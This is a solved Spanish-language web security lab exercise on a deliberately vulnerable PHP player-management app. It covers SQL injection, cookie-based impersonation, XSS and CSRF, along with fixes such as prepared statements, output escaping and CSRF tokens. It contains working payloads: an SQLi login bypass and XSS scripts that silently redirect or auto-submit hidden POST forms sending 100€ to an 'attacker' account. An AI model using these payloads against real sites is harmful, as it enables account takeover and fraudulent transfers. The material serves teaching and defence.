## Parte 1 - SQLi

La página no permite añadir jugadores a usuarios no autenticados, un formulario nos exige que introduzcamos un usuario y contraseña válidos. Lo primero que haremos es comprobar que este formulario es vulnerable a una inyección y aprovecharlo para saltarnos esta protección.

a) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.

|                    Escribo los valores                    |                                 "                                 |
| :-------------------------------------------------------: | :---------------------------------------------------------------: |
|                     **En los campos**                     |                         **User/Password**                         |
|              **Del formulario de la página**              |                       **insert_player.php**                       |
|           **La consulta SQL que se ejecuta es**           | **```SELECT userId, password FROM users WHERE username = """```** |
|  **Campos del formulario web utilizado en la consulta**   |                           **username**                            |
| **Campos del formulario web no utilizado en la consulta** |                           **password**                            |
b) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):
- password
- 123456
- 12345678
- 1234
- qwerty
- 12345678
- dragon
Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.

| Explicación del ataque                                    | El ataque consiste en repetir  `"OR 1=1 AND username= $username AND password = $password -- - `utilizando en cada interacción una constraseña diferente del diccionario |
| --------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| **Campo de usuario con el que el ataque ha tenido éxito** |                                                                                **luis**                                                                                 |
| **Campo de contraseña con que el ataque ha tenido éxito** |                                                                                **1234**                                                                                 |
c) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza `SQLite3::escapeString()`, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.

|          **Explicación del error**           |                               **Es debido a que ese método se utiliza para escapar caracteres especiales en cadenas pero no da protección contra SQLi**                                |
| :------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| **Solución: Cambiar la línea con el código** |                                      ```$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');```                                      |
|          **por la siguiente línea**          | ```$query = $db->prepare('SELECT userId, password FROM users WHERE username = :username');<br>$query->bindValue(':username', $user, SQLITE3_TEXT);<br>$result = $stmt**->execute();``` |
d) Si habéis tenido éxito con el _apartado b)_, os habéis autenticado utilizando el usuario `luis` (si no habéis tenido éxito, podéis utilizar la contraseña _1234_ para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora _Candela Pacheco_, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.

Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre el directorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo `add\_comment.php~`. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos `.php~` sino que los muestran como archivos de texto sin interpretar.

Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?


| **Vulnerabilidad detectada**                         | Uso de cookie userId sin validación, permitiendo suplantación de identidad.                                 |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Descripción del ataque**                           | **Modificación manual/automática de la cookie para publicar comentarios fraudulentos como otros usuarios.** |
| **¿Cómo podemos hacer que sea segura esta entrada?** | **Validar _userId_ desde sesión autenticada, usar tokens CSRF, encriptar cookies y consultas preparadas.**  |
## Parte 2 - XSS

En vistas de los problemas de seguridad que habéis encontrado, empezáis a sospechar que esta aplicación quizás es vulnerable a XSS (Cross Site Scripting).

a) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert» de Javascript al consultar el listado de mensajes.

| Introduzco el mensaje         | `<script>alert("XSS")</script>`<br> |
| ----------------------------- | ----------------------------------- |
| En el formulario de la página | show_comments.php                   |
b) Por qué dice `&amp;` cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?

| Explicación | En HTML, &amp; reemplaza & para evitar que el navegador interprete los parámetros GET como entidades HTML inválidas, manteniendo la URL correcta. |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
c) Explicad cuál es el problema de `show\_comments.php`, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.

| ¿Cuál es el problema?                    | Se utiliza directamente el valor de `$_GET['id']` y datos de la base de datos en el HTML sin ninguna sanitización o escape, lo que podría permitir un ataque XSS si los datos contienen código malicioso. |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Sustituyo el código de la/las líneas** | `echo "<div><h4> ". $row['username'] ."</h4><p>commented: " .$row['body'] . "</p></div>";`                                                                                                                |
| **por el siguiente código**              | `echo "<div><h4>" . htmlspecialchars($row['username'],ENT_QUOTES, 'UTF-8') . "</h4><p>commented: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') . "</p><br><br>       </div>";`                  |
d) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.

| Otras páginas afectadas      | list_players, buscador.php                                                                                                                                                        |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **¿Cómo lo he descubierto?** | He probado metiendo esta sentencia `<script>alert("XSS")</script>` para ver si cuando la mandara me saliera el alert para ver si era inseguro y efectivamente me saltaba el alert |
## Parte 3 - Control de acceso, autenticación y sesiones de usuarios

**a) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de `register.php` tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.** 

Primero, se usa una función especial (`SQLite3::escapeString`) que limpia los datos que mete el usuario para que no se pueda colar código malicioso en la base de datos (inyección SQL). También se comprueba que el formulario se envíe usando el método `POST`, asegurando que las solicitudes sean reales y no un CSRF.

Los campos del formulario tienen `required`, obligando a los usuarios a rellenarlos bien antes de enviarlo. Quitamos un campo oculto (`id`) que no hacía falta y podía usarse para cosas malas. Además, la redirección tras registrar un usuario incluye un `exit` para que no se ejecute nada más después.

Por último, los mensajes de error no revelan datos sensibles.

**b) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`**

Para garantizar la seguridad del sistema de login, aplicamos varias medidas presentes en el archivo asegurado (`auth.php`). Utilizamos sesiones (`$_SESSION`) para gestionar información sensible como el `userId`, evitando el uso de cookies y mejorando la protección. Las credenciales se validan con `password_verify`, comparando las contraseñas de forma segura y protegiendo los datos cifrados en la base de datos.
	
Las consultas SQL emplean sentencias preparadas con SQLite3, lo que elimina el riesgo de inyección SQL. Además, sanitizamos las entradas del usuario con `htmlspecialchars` para evitar ataques XSS. Los mensajes de error son genéricos, lo que dificulta ataques de fuerza bruta al no revelar si el fallo está en el usuario o en la contraseña. Por último, el cierre de sesión elimina todos los datos activos con `session_unset` y `session_destroy`, garantizando que no haya información reutilizable.

**c) Volvemos a la página de `register.php`, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.**

El cambio que hemos implementado es que solo puedan registrar nuevos usuarios los usuarios que tengan rol de administrador.

**d) Al comienzo de la práctica hemos supuesto que la carpeta `private` no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?**

Al configurarlo de forma local tenemos acceso a la carpeta private para no tener acceso a la carpeta private lo que deberíamos hacer es configurar los permisos de la carpeta para que sus archivos sean lo mas restrictivo posible.

**e) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.**

Si ya que no tiene un token CSRF ni lo verifica entonces podría suplantar la identidad del usuario por eso hemos implementado tanto la creación como la verificación del token CSRF.
## Parte 4 - Servidores web

¿Qué medidas de seguridad se implementaríais en el servidor web para reducir el riesgo a ataques?

Para proteger un servidor web es fundamental mantener el sistema y los servicios actualizados, además de implementar firewalls y sistemas de detección de intrusos. Es crucial usar HTTPS con certificados SSL/TLS y aplicar el principio de mínimo privilegio para limitar accesos. También se debe configurar autenticación de dos factores y realizar copias de seguridad regulares. Para prevenir ataques, es importante protegerse contra DDoS, sanitizar entradas y salidas para evitar inyecciones, y usar contraseñas fuertes y únicas. Monitorear constantemente el tráfico y los registros, educar al personal sobre seguridad y establecer una política clara son pasos esenciales en este proceso continuo.

### Parte 5 - CSRF

Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: [http://web.pagos/donate.php?amount=100&receiver=attacker,](http://web.pagos/donate.php?amount=100&receiver=attacker) mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).

**a) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado _Profile_ que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.**


| En el campo    | team                                                                                                                                                   |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Introduzco** | **`<form action="http://web.pagos/donate.php?amount=100&receiver=attacker" method="get"> <button type="submit">Profile</button> </form>`**<br><br><br> |

**b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**

Claro que aumentaría ya que con entrar cargaría el script  directamente y mandaría el pago sin aviso.

```JavaScript
<script> setTimeout(function() { document.location = 'http://www.donate.co/?amount=100&dest=ACMEScouting&t=' + new Date().getTime(); }, 100); </script>
```

Lo que hace este script malicioso  es aprovecharse de una vulnerabilidad XSS para redirigir usuarios sin su consentimiento. Esta formado por:

- `setTimeout()`: Genera un pequeño retraso de 100 milisegundos para evadir detección inmediata
- `document.location`: Fuerza el cambio de URL del navegador
- Parámetros dinámicos: Añade timestamp para hacer cada redirección única
- Inserción en comentario: Oculta el código para que parezca contenido legítimo

**c) Pero _web.pagos_ sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.**

**Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).**

Para que la donación se efectúe, el usuario debe estar previamente autenticado en web.pagos y tener una sesión activa al momento de la redirección.

**d) Si _web.pagos_ modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.**
```JavaScript
<script>
setTimeout(function() {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://web.pagos/donate.php';
  var amount = document.createElement('input');
  amount.type = 'hidden';
  amount.name = 'amount';
  amount.value = '100';
  var receiver = document.createElement('input');
  receiver.type = 'hidden';
  receiver.name = 'receiver';
  receiver.value = 'attacker';
  form.appendChild(amount);
  form.appendChild(receiver);
  document.body.appendChild(form);
  form.submit();
}, 100);
</script>
```

Este script crea un ataque XSS que envía datos por POST:

1. setTimeout: Retrasa la ejecución 100ms para evadir detecciones.
2. createElement('form'): Crea un formulario oculto.
3. createElement('input'): Crea campos ocultos para 'amount' y 'receiver'.
4. appendChild: Añade los campos al formulario.
5. document.body.appendChild(form): Inserta el formulario en la página.
6. form.submit(): Envía el formulario automáticamente.